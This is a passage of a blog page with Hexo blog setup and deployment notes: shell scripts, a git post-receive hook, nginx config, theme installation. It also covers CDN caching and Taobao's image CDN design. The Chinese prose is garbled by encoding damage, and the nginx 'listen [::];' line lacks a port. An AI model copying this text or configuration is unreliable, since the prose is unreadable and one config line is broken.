class="line">  field: post</span><br><span class="line">  content: true</span><br><span class="line">  format: html</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">next/â€”â€”config.yml</span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash">Local search</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Dependencies: https://github.com/next-theme/hexo-generator-searchdb</span></span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">If auto, trigger search by changing input.</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">If manual, trigger search by pressing enter key or search button.</span></span><br><span class="line">  trigger: auto</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  top_n_per_article: 1</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">Unescape html strings to the readable one.</span></span><br><span class="line">  unescape: false</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">Preload the search data when the page loads.</span></span><br><span class="line">  preload: false</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç»‘å®šåŸŸå</span></span><br><span class="line">cd blog/source</span><br><span class="line">vi CNAME</span><br><span class="line">blog.yc0623.asia</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç¼–å†™è„šæœ¬debug.sh</span></span><br><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s --debug</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŠŠæœ¬åœ°blogä¸Šä¼ åˆ°github</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">githubåˆ›å»ºä»“åº“blog</span></span><br><span class="line">cd blog</span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git rm -f --cached themes/next</span><br><span class="line">git submodule add https://github.com/next-theme/hexo-theme-next.git themes/next</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å°†æœ¬åœ°é¡¹ç›®ä¸è¿œç¨‹ä»“åº“å…³è”</span></span><br><span class="line">git remote add origin https://github.com/pure-cyc/blog.git</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç¬¬ä¸€æ¬¡æäº¤éœ€è¦-uï¼Œè¯¥-uæ ‡å¿—æ·»åŠ äº†å¯¹æ‚¨æ¨é€åˆ°çš„ä¸Šæ¸¸æœåŠ¡å™¨çš„è·Ÿè¸ªå¼•ç”¨ã€‚</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¸€æ—¦ä½ åšäº†ä¸€ä¸ªgit push -u origin masterï¼Œä½ å¯ä»¥ç¨åè°ƒç”¨git pullï¼Œgit å°±ä¼šçŸ¥é“ä½ å®é™…ä¸Šæ˜¯æŒ‡git pull origin master.</span></span><br><span class="line">git push -u origin master</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç¼–å†™pushAndDeployment.sh</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">git add .</span><br><span class="line">time=$(date &quot;+%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line">echo &quot;Site updated: $&#123;time&#125;&quot;</span><br><span class="line">git commit -m &quot;Site updated: $&#123;time&#125;&quot;</span><br><span class="line">echo &quot;Commit success&quot;</span><br><span class="line">git push</span><br><span class="line">echo &quot;Push success&quot;</span><br><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">echo &quot;Deployment success&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">éƒ¨ç½²</span></span><br><span class="line">cd blog</span><br><span class="line">./pushAndDeployment.sh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Š</span></span><br><span class="line">yum install nginx git</span><br><span class="line"></span><br><span class="line">mkdir /var/repo</span><br><span class="line"></span><br><span class="line">chmod 755 /var/repo</span><br><span class="line"></span><br><span class="line">mkdir /var/blog</span><br><span class="line">chmod 755 /var/blog</span><br><span class="line"></span><br><span class="line">cd /var/repo</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ›å»ºä¸€ä¸ªç©ºç™½çš„gitä»“åº“</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">1.git init åˆ›å»ºæœ¬åœ°ä»“åº“(åœ¨å·¥ç¨‹ç›®å½•ä¸‹åˆ›å»º)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">2.git init --bare åˆ›å»ºè¿œç«¯ä»“åº“ï¼ˆåœ¨æœåŠ¡å™¨æˆ–è€…å·¥ç¨‹ç›®å½•ä»¥å¤–è·¯å¾„éƒ½å¯ä»¥åˆ›å»ºçš„å¤‡ä»½ä»“åº“ï¼‰</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å·¥ç¨‹commitåˆ°1ä¸­ï¼Œpushåˆ°2ä¸­ï¼›</span></span><br><span class="line">git init --bare blog.git</span><br><span class="line"></span><br><span class="line">vim /var/repo/blog.git/hooks/post-receive</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">git --work-tree=/var/blog --git-dir=/var/repo/blog.git checkout -f</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç»™post-receiveæ·»åŠ æ‰§è¡Œæƒé™</span></span><br><span class="line">chmod +x /var/repo/blog.git/hooks/post-receive</span><br><span class="line"></span><br><span class="line">cd /etc/nginx/conf.d/</span><br><span class="line">vim blog.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen    80;</span><br><span class="line">    listen    [::];</span><br><span class="line">    server_name  www.mingwzi.cn;</span><br><span class="line">    root    /var/blog;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nginx -t</span><br><span class="line"></span><br><span class="line">nginx -s reload</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">mac</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¿®æ”¹Hexoçš„deployé…ç½®</span></span><br><span class="line">cd blog</span><br><span class="line">vim _config.yml</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ‰¾åˆ°deployé…ç½®éƒ¨åˆ†</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Deployment</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment"># Docs: https://hexo.io/docs/deployment.html</span></span></span><br><span class="line">deploy:</span><br><span class="line">- type: git</span><br><span class="line">  repo: root@81.68.97.129:/var/repo/blog.git # IPå¡«å†™è‡ªå·±æœåŠ¡å™¨çš„IPå³å¯</span><br><span class="line">  branch: master</span><br><span class="line">- type: git</span><br><span class="line">  repo: https://github.com/HuangMingwang/HuangMingwang.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line">- type: git</span><br><span class="line">  repo: root@43.154.81.112:/var/repo/blog.git</span><br><span class="line">  branch: master</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">hexo å®‰è£…butterflyä¸»é¢˜</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åœ¨hexoæ ¹ç›®å½•ä¸‹</span></span><br><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¿®æ”¹hexoæ ¹ç›®å½•ä¸‹çš„_config.yml</span></span><br><span class="line">theme: butterfly</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å®‰è£… pug ä»¥åŠ stylus çš„æ¸²æŸ“å™¨</span></span><br><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ·»åŠ å¤‡æ¡ˆå·</span></span><br><span class="line">cd themes/butterfly/layout/includes/</span><br><span class="line">vim footer.pug</span><br><span class="line"></span><br><span class="line">span.footer-separator |</span><br><span class="line">&lt;a href=&quot;https://beian.miit.gov.cn/&quot; target=&quot;_blank&quot;&gt;èµ£ICPå¤‡2022001353å·-1&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<h2 id="é…ç½®CDN"><a href="#é…ç½®CDN" class="headerlink" title="é…ç½®CDN"></a>é…ç½®CDN</h2><p>çœŸå®åç§°è®°å½•ï¼ˆè‹±è¯­ï¼šCanonical Name Recordï¼‰ï¼Œå³CNAMEè®°å½•ï¼Œæ˜¯åŸŸåç³»ç»Ÿï¼ˆDNSï¼‰çš„ä¸€ç§è®°å½•ã€‚CNAMEè®°å½•ç”¨äºå°†ä¸€ä¸ªåŸŸåï¼ˆåŒåï¼‰æ˜ å°„åˆ°å¦ä¸€ä¸ªåŸŸåï¼ˆçœŸå®åç§°ï¼‰ï¼ŒåŸŸåè§£ææœåŠ¡å™¨é‡åˆ°CNAMEè®°å½•ä¼šä»¥æ˜ å°„åˆ°çš„ç›®æ ‡é‡æ–°å¼€å§‹æŸ¥è¯¢ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191129397.png" alt="img"></p>
<ol>
<li>ç”¨æˆ·å‘ <code>www.test.com</code> ä¸‹çš„æŸå›¾ç‰‡èµ„æºï¼ˆå¦‚ï¼š1.jpgï¼‰å‘èµ·è¯·æ±‚ï¼Œä¼šå…ˆå‘ Local DNS å‘èµ·åŸŸåè§£æè¯·æ±‚ã€‚</li>
<li>å½“ Local DNS è§£æ <code>www.test.com</code> æ—¶ï¼Œä¼šå‘ç°å·²ç»é…ç½®äº† CNAME <code>www.test.com.cdn.dnsv1.com</code>ï¼Œè§£æè¯·æ±‚ä¼šå‘é€è‡³ Tencent DNSï¼ˆGSLBï¼‰ï¼ŒGSLB ä¸ºè…¾è®¯äº‘è‡ªä¸»ç ”å‘çš„è°ƒåº¦ä½“ç³»ï¼Œä¼šä¸ºè¯·æ±‚åˆ†é…æœ€ä½³èŠ‚ç‚¹ IPã€‚</li>
<li>Local DNS è·å– Tencent DNS è¿”å›çš„è§£æ IPã€‚</li>
<li>ç”¨æˆ·è·å–è§£æ IPã€‚</li>
<li>ç”¨æˆ·å‘è·å–çš„ IP å‘èµ·å¯¹èµ„æº 1.jpg çš„è®¿é—®è¯·æ±‚ã€‚</li>
<li>è‹¥è¯¥ IP å¯¹åº”çš„èŠ‚ç‚¹ç¼“å­˜æœ‰ 1.jpgï¼Œåˆ™ä¼šå°†æ•°æ®ç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼ˆ10ï¼‰ï¼Œæ­¤æ—¶è¯·æ±‚ç»“æŸã€‚è‹¥è¯¥èŠ‚ç‚¹æœªç¼“å­˜ 1.jpgï¼Œåˆ™èŠ‚ç‚¹ä¼šå‘ä¸šåŠ¡æºç«™å‘èµ·å¯¹ 1.jpg çš„è¯·æ±‚ï¼ˆ6ã€7ã€8ï¼‰ï¼Œè·å–èµ„æºåï¼Œç»“åˆç”¨æˆ·è‡ªå®šä¹‰é…ç½®çš„ç¼“å­˜ç­–ç•¥ï¼ˆå¯å‚è€ƒäº§å“æ–‡æ¡£ä¸­çš„ <a href="https://cloud.tencent.com/doc/product/228/6290">ç¼“å­˜è¿‡æœŸé…ç½®</a>ï¼‰ï¼Œå°†èµ„æºç¼“å­˜è‡³èŠ‚ç‚¹ï¼ˆ9ï¼‰ï¼Œå¹¶è¿”å›ç»™ç”¨æˆ·ï¼ˆ10ï¼‰ï¼Œæ­¤æ—¶è¯·æ±‚ç»“æŸã€‚</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -o /dev/test -s -w %&#123;time_namelookup&#125;::%&#123;time_connect&#125;::%&#123;time_starttransfer&#125;::%&#123;time_total&#125;::%&#123;speed_download&#125;&quot;\n&quot; &quot;http://www.mingwzi.cn&quot; </span><br></pre></td></tr></table></figure>





<h3 id="cdnä½¿ç”¨ä»»æ’­æŠ€æœ¯å¯ä»¥åˆ†æ‘Šæµé‡ï¼Œé˜²å¾¡ddosæ”»å‡»ï¼Ÿ"><a href="#cdnä½¿ç”¨ä»»æ’­æŠ€æœ¯å¯ä»¥åˆ†æ‘Šæµé‡ï¼Œé˜²å¾¡ddosæ”»å‡»ï¼Ÿ" class="headerlink" title="cdnä½¿ç”¨ä»»æ’­æŠ€æœ¯å¯ä»¥åˆ†æ‘Šæµé‡ï¼Œé˜²å¾¡ddosæ”»å‡»ï¼Ÿ"></a>cdnä½¿ç”¨ä»»æ’­æŠ€æœ¯å¯ä»¥åˆ†æ‘Šæµé‡ï¼Œé˜²å¾¡ddosæ”»å‡»ï¼Ÿ</h3><h3 id="æºç«™å†…å®¹å‘ç”Ÿå˜æ›´ï¼Œcdnå¦‚ä½•æ„ŸçŸ¥åˆ°ï¼Ÿ"><a href="#æºç«™å†…å®¹å‘ç”Ÿå˜æ›´ï¼Œcdnå¦‚ä½•æ„ŸçŸ¥åˆ°ï¼Ÿ" class="headerlink" title="æºç«™å†…å®¹å‘ç”Ÿå˜æ›´ï¼Œcdnå¦‚ä½•æ„ŸçŸ¥åˆ°ï¼Ÿ"></a>æºç«™å†…å®¹å‘ç”Ÿå˜æ›´ï¼Œcdnå¦‚ä½•æ„ŸçŸ¥åˆ°ï¼Ÿ</h3><h3 id="CDNçš„åŠ é€Ÿæ–¹å¼ï¼Ÿ"><a href="#CDNçš„åŠ é€Ÿæ–¹å¼ï¼Ÿ" class="headerlink" title="CDNçš„åŠ é€Ÿæ–¹å¼ï¼Ÿ"></a>CDNçš„åŠ é€Ÿæ–¹å¼ï¼Ÿ</h3><p>è·ç¦»è¿‘ï¼Œæ–‡ä»¶å‹ç¼©ï¼Œ</p>
<p>cdnå¯ä»¥çœé’±ï¼Œå¯ä»¥å°‘èµ°å¾ˆå¤šè·¯</p>
<p>â€¦.</p>
<h3 id="æ·˜å®å›¾ç‰‡ç©ºé—´å’ŒCDNçš„æ¶æ„"><a href="#æ·˜å®å›¾ç‰‡ç©ºé—´å’ŒCDNçš„æ¶æ„" class="headerlink" title="æ·˜å®å›¾ç‰‡ç©ºé—´å’ŒCDNçš„æ¶æ„"></a>æ·˜å®å›¾ç‰‡ç©ºé—´å’ŒCDNçš„æ¶æ„</h3><p>æ·˜å®æ•´ä¸ªå›¾ç‰‡çš„è®¿é—®é“¾è·¯æœ‰<a href="https://www.zhihu.com/search?q=%E4%B8%89%E7%BA%A7%E7%BC%93%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">ä¸‰çº§ç¼“å­˜</a>ï¼ˆå®¢æˆ·ç«¯æœ¬åœ°ã€CDN L1ã€CDN L2ï¼‰ï¼Œæ‰€æœ‰å›¾ç‰‡éƒ½æŒä¹…åŒ–çš„å­˜å‚¨åˆ°OSSä¸­ã€‚çœŸæ­£å¤„ç†å›¾ç‰‡çš„æ˜¯<a href="https://www.zhihu.com/search?q=img-picasso%E7%B3%BB%E7%BB%9F&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">img-picassoç³»ç»Ÿ</a>ï¼Œå®ƒçš„åŠŸèƒ½æ¯”è¾ƒå¤æ‚ï¼ŒåŒ…æ‹¬ä»OSSè¯»å–æ–‡ä»¶ï¼Œå¯¹å›¾ç‰‡å°ºå¯¸è¿›è¡Œç¼©æ”¾ï¼Œç¼–è§£ç ï¼Œæ‰€ä»¥æœºå™¨æˆæœ¬æ¯”è¾ƒé«˜ã€‚</p>
<p>CDNçš„ç¼“å­˜åˆ†æˆ2çº§ï¼Œåˆç†çš„åˆ†é…L1å’ŒL2çš„æ¯”ä¾‹ï¼Œä¸€æ–¹é¢ï¼Œå¯ä»¥é€šè¿‡ä¸€è‡´æ€§hashçš„æ‰‹æ®µï¼Œåœ¨åŒç­‰èµ„æºçš„æƒ…å†µä¸‹ï¼Œç¼“å­˜æ›´å¤šå†…å®¹ï¼Œæå‡æ•´ä½“ç¼“å­˜å‘½ä¸­ç‡ï¼›å¦ä¸€æ–¹é¢ï¼Œå¯ä»¥å¹³è¡¡è®¡ç®—å’ŒIOï¼Œå……åˆ†åˆ©ç”¨ä¸åŒé…ç½®çš„æœºå™¨çš„èƒ½åŠ›ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458499.jpg" alt="img"></p>
<p>ç”¨æˆ·è®¿é—®å›¾ç‰‡çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š<br>ï¼ˆ1ï¼‰ç”¨æˆ·é€šè¿‡æ‰‹æœºæ·˜å®æ¥æœç´¢å•†å“æˆ–è€…æŸ¥çœ‹å®è´è¯¦æƒ…ã€‚<br>ï¼ˆ2ï¼‰è¯¦æƒ…&#x2F;æœç´¢&#x2F;æ¨èé€šè¿‡è°ƒç”¨å•†å“ä¸­å¿ƒè¿”å›å•†å“çš„<a href="https://www.zhihu.com/search?q=%E5%9B%BE%E7%89%87UR&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">å›¾ç‰‡UR</a>Lã€‚<br>ï¼ˆ3ï¼‰å®¢æˆ·ç«¯æœ¬åœ°å¦‚æœæœ‰è¯¥å›¾ç‰‡çš„ç¼“å­˜ï¼Œåˆ™ç›´æ¥æ¸²æŸ“å›¾ç‰‡ï¼Œå¦åˆ™æ‰§è¡Œä¸‹ä¸€æ­¥ã€‚<br>ï¼ˆ4ï¼‰ä»CDN L1å›æºå›¾ç‰‡ï¼Œå¦‚æœL1æœ‰è¯¥å›¾ç‰‡çš„ç¼“å­˜ï¼Œåˆ™å®¢æˆ·ç«¯æ¸²æŸ“å›¾ç‰‡ï¼ŒåŒæ—¶ç¼“å­˜åˆ°æœ¬åœ°ï¼Œå¦‚æœL1æ²¡æœ‰ç¼“å­˜ï¼Œåˆ™æ‰§è¡Œä¸‹ä¸€æ­¥ã€‚<br>ï¼ˆ5ï¼‰ä»CDN L2å›æºå›¾ç‰‡ï¼Œå¦‚æœL2æœ‰è¯¥å›¾ç‰‡çš„ç¼“å­˜ï¼Œåˆ™å®¢æˆ·ç«¯æ¸²æŸ“å›¾ç‰‡ï¼ŒåŒæ—¶CDN L1åŠå®¢æˆ·ç«¯ç¼“å­˜å›¾ç‰‡å†…å®¹ï¼Œå¦‚æœCDN L2æ²¡æœ‰ç¼“å­˜è¯¥å›¾ç‰‡ï¼Œåˆ™æ‰§è¡Œä¸‹ä¸€æ­¥ã€‚<br>ï¼ˆ6ï¼‰ä»å›¾ç‰‡ç©ºé—´å›æºå›¾ç‰‡ï¼Œå›¾ç‰‡ç©ºé—´ä¼šä»OSSæ‹‰å–å›¾ç‰‡æºæ–‡ä»¶ï¼ŒæŒ‰è¦æ±‚è¿›è¡Œå°ºå¯¸ç¼©æ”¾ï¼Œç„¶åæ‰§è¡Œç¼–è§£ç ï¼Œè¿”å›å®¢æˆ·ç«¯èƒ½å¤Ÿæ”¯æŒçš„å›¾ç‰‡å†…å®¹ï¼Œä¹‹åå®¢æˆ·ç«¯å°±å¯ä»¥æ¸²æŸ“å›¾ç‰‡ï¼ŒåŒæ—¶CDNçš„L1ã€L2ä»¥åŠå®¢æˆ·ç«¯éƒ½ä¼šç¼“å­˜å›¾ç‰‡å†…å®¹ã€‚</p>
<h4 id="é¢‘ç¹æ¢å›¾å¸¦æ¥çš„æŠ€æœ¯æŒ‘æˆ˜"><a href="#é¢‘ç¹æ¢å›¾å¸¦æ¥çš„æŠ€æœ¯æŒ‘æˆ˜" class="headerlink" title="é¢‘ç¹æ¢å›¾å¸¦æ¥çš„æŠ€æœ¯æŒ‘æˆ˜"></a>é¢‘ç¹æ¢å›¾å¸¦æ¥çš„æŠ€æœ¯æŒ‘æˆ˜</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458642.jpg" alt="img"></p>
<p>å½“å•†å“çš„ä»·æ ¼å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨æ–°çš„ä»·æ ¼é‡æ–°åˆæˆå›¾ç‰‡ï¼Œæ›´æ–°å•†å“ä¸­å¿ƒä¸­å­˜å‚¨çš„å›¾ç‰‡URLã€‚</p>
<p>è¿™æ ·ä¼šå¸¦æ¥2ä¸ªé—®é¢˜ï¼š<br>ï¼ˆ1ï¼‰CDNåŠæ‰‹æœºæ·˜å®åŸæœ¬ç¼“å­˜çš„å›¾ç‰‡å†…å®¹å¤±æ•ˆäº†ï¼Œç”¨æˆ·è®¿é—®å›¾ç‰‡ä¼šå…¨éƒ¨å›æºåˆ°img-picassoã€‚<br>ï¼ˆ2ï¼‰ç”±äºæ›´æ”¹äº†å•†å“çš„å­—æ®µï¼Œäº¤æ˜“çš„æ ¸å¿ƒåº”ç”¨ï¼ˆè´­ç‰©è½¦å’Œå•†å“ä¸­å¿ƒï¼‰çš„ç¼“å­˜ä¹Ÿå¤±æ•ˆäº†ï¼Œç”¨æˆ·æµè§ˆåŠè´­ç‰©æ—¶ï¼Œå¯¹å•†å“çš„è®¿é—®ä¼šèµ°åˆ°dbã€‚</p>
<p>æºç«™img-picassoå¤„ç†å›¾ç‰‡ï¼Œä»¥åŠæŸ¥è¯¢å•†å“DBï¼Œéƒ½æ˜¯éå¸¸æ¶ˆè€—èµ„æºçš„ã€‚CDNåŠå•†å“çš„ç¼“å­˜å‘½ä¸­ç‡é™ä½åï¼Œå¯¹æºç«™img-picsassoä»¥åŠdbä¼šäº§ç”Ÿå·¨å¤§çš„å‹åŠ›ã€‚</p>
<p>æ‹¿CDNç¼“å­˜ä¸ºä¾‹ï¼Œç®€å•è®¡ç®—ä¸€ä¸‹ï¼ŒCDNå¹³æ—¶çš„å‘½ä¸­ç‡æ˜¯98%ï¼Œå‡è®¾å‘½ä¸­ç‡é™ä½1ä¸ªç‚¹ï¼Œå¯¹æºç«™çš„å‹åŠ›å°±ä¼šå¢åŠ 1&#x2F;3ï¼ˆåŸæœ¬æ‰¿æ‹…2%çš„æµé‡ï¼Œç°åœ¨éœ€è¦æ‰¿æ‹…3%çš„æµé‡ï¼‰ï¼Œæ„å‘³ç€img-picassoéœ€è¦æ‰©å®¹1&#x2F;3ã€‚å¦‚æœå…¨ç½‘ä¸€åŠçš„å›¾ç‰‡éƒ½åŒæ—¶å˜åŒ–ï¼Œcdnçš„å‘½ä¸­ç‡é™åˆ°50%ï¼Œå¯¹img-picassoçš„è®¿é—®é‡å°±ä¼šå¢åŠ 25å€ï¼Œè¿™ä¸ªæ‰©å®¹æˆæœ¬è‚¯å®šæ²¡æ³•æ¥å—ã€‚</p>
<p>è§£å†³è¿™2ä¸ªé—®é¢˜ï¼Œå¯¹åº”çš„æœ‰2ä¸ªåŠæ³•ï¼š<br>ï¼ˆ1ï¼‰æ”¹å›¾ä¿æŒå›¾ç‰‡URLä¸å˜ï¼Œå¯ä»¥é¿å…<a href="https://www.zhihu.com/search?q=%E5%95%86%E5%93%81%E9%93%BE%E8%B7%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">å•†å“é“¾è·¯</a>çš„ç¼“å­˜å¤±æ•ˆã€‚<br>ï¼ˆ2ï¼‰åœ¨è®¿é—®é«˜å³°åˆ°æ¥ä¹‹å‰ï¼Œæå‰é¢„çƒ­å›¾ç‰‡åˆ°CDNï¼Œå¯ä»¥é¿å…CDNç¼“å­˜å¤±æ•ˆå¯¹æºç«™çš„å‹åŠ›ã€‚</p>
<p>ä¸‹é¢ï¼Œä»‹ç»ä¸‹æˆ‘ä»¬å…·ä½“æ˜¯æ€ä¹ˆåšåˆ°è¿™2ç‚¹çš„ã€‚</p>
<h4 id="é¢‘ç¹æ¢å›¾çš„åº”å¯¹æ–¹æ¡ˆ"><a href="#é¢‘ç¹æ¢å›¾çš„åº”å¯¹æ–¹æ¡ˆ" class="headerlink" title="é¢‘ç¹æ¢å›¾çš„åº”å¯¹æ–¹æ¡ˆ"></a>é¢‘ç¹æ¢å›¾çš„åº”å¯¹æ–¹æ¡ˆ</h4><p><strong>æ”¹å›¾ä¿æŒå›¾ç‰‡URLä¸å˜</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458800.jpg" alt="img"></p>
<p>å›¾ç‰‡å†…å®¹å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ‰§è¡Œä¸‹é¢2ä¸ªæ“ä½œï¼š<br>ï¼ˆ1ï¼‰æ›´æ–°OSSå†…å®¹ï¼šä½¿ç”¨æ–°çš„å›¾ç‰‡å†…å®¹æ›¿æ¢OSSä¸­è€çš„å›¾ç‰‡å†…å®¹<br>ï¼ˆ2ï¼‰åˆ·æ–°CDNç¼“å­˜ï¼šæ¸…é™¤CDNä¹‹å‰ç¼“å­˜çš„å›¾ç‰‡å†…å®¹</p>
<p>è¿™æ ·ï¼Œç”¨æˆ·å†æ¬¡è®¿é—®å›¾ç‰‡æ—¶ï¼Œå‘ç°CDNæ²¡æœ‰ç¼“å­˜ï¼Œå°±ä¼šå›æºåˆ°img-picassoï¼Œä»OSSæ‹‰å–æ–°çš„å›¾ç‰‡å†…å®¹ã€‚</p>
<p>ç”±äºå›¾ç‰‡URLæ²¡æœ‰å˜åŒ–ï¼Œå°±ä¸å¿…å»æ›´æ–°å•†å“ä¸­å¿ƒçš„å›¾ç‰‡é“¾æ¥ï¼Œè¿™æ ·å•†å“é“¾è·¯çš„ç¼“å­˜å¯ä»¥ä¿æŒä¸å˜ã€‚<br>åœ¨çœŸæ­£å®æ–½è¿™ä¸ªæ–¹æ¡ˆçš„è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°äº†å‡ ä¸ªé—®é¢˜ï¼Œç®€å•è·Ÿå¤§å®¶åˆ†äº«ä¸‹ï¼š</p>
<p><strong>OSSä¸‰åœ°åŒæ­¥</strong></p>
<p>æ·˜å®çš„å›¾ç‰‡ç©ºé—´ï¼Œæ‰¿è½½äº†æ·˜ç³»æ‰€æœ‰å›¾ç‰‡çš„ä¸Šä¸‹è¡Œç¨³å®šæ€§ä¿éšœï¼Œä¸ºäº†ä¿éšœé«˜å¯ç”¨ï¼Œä¸€ä»½èµ„æºä¼šå­˜å‚¨åˆ°ä¸‰åœ°OSSã€‚å›¾ç‰‡ä¸Šä¼ æ—¶ï¼Œé»˜è®¤åªä¸Šä¼ ä¸€åœ°ï¼Œåˆ©ç”¨OSSçš„èƒ½åŠ›ï¼Œè‡ªåŠ¨åŒæ­¥åˆ°å¦å¤–ä¸¤åœ°ã€‚</p>
<pre><code> ä½†æ˜¯ä½¿ç”¨URLä¸å˜æ–¹æ¡ˆï¼ŒCDNç¼“å­˜å·²ç»æ¸…é™¤å®Œæˆåï¼Œå¦‚æœå¦å¤–2åœ°çš„OSSè¿˜æœªåŒæ­¥å®Œæˆï¼Œç”¨æˆ·è®¿é—®åï¼Œå°±ä¼šå›æºåˆ°æ—§çš„å›¾ç‰‡å†…å®¹ï¼Œå‘ç°å›¾ç‰‡å†…å®¹æ²¡æœ‰å˜åŒ–ã€‚


  é’ˆå¯¹è¯¥é—®é¢˜ï¼Œæˆ‘ä»¬å°†å¼‚æ­¥åŒæ­¥OSSè½¯é“¾çš„æ¨¡å¼ï¼Œæ”¹æˆä¸‰åœ°åŒæ­¥å»ºè½¯é“¾ï¼Œä¸‰åœ°éƒ½è¿”å›æˆåŠŸåï¼Œå†å»æ¸…é™¤CDNç¼“å­˜ï¼Œè¿™å°±ä¿è¯äº†ç”¨æˆ·è®¿é—®çš„å›¾ç‰‡ä¸€å®šæ˜¯æœ€æ–°çš„å†…å®¹ã€‚
</code></pre>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458123.jpg" alt="img"></p>
<p><strong>å›¾ç‰‡å°ºå¯¸æ”¶æ•›</strong></p>
<p>åŒä¸€å¼ å•†å“å›¾ç‰‡ä¼šç”¨äºä¸åŒçš„åœºæ™¯å‘ä½å±•ç°ï¼Œä¸åŒçš„å‘ä½å¯¹å›¾ç‰‡çš„å°ºå¯¸æœ‰ä¸åŒçš„è¦æ±‚ã€‚ä¸ºæ­¤ï¼Œå›¾ç‰‡ç©ºé—´æä¾›äº†ä¸€é¡¹åŠŸèƒ½ï¼Œå¯ä»¥æ–¹ä¾¿çš„ç”Ÿæˆä¸åŒå°ºå¯¸çš„ç¼©ç‡å›¾ã€‚åªéœ€è¦è®¿é—®å›¾ç‰‡æ—¶ï¼Œç»™å›¾ç‰‡å¢åŠ ä¸åŒçš„åç¼€ï¼Œimg-picassoæºç«™å°±å¯ä»¥æŒ‰è¦æ±‚è¿›è¡Œå›¾ç‰‡è¿›è¡Œç¼©æ”¾ã€‚</p>
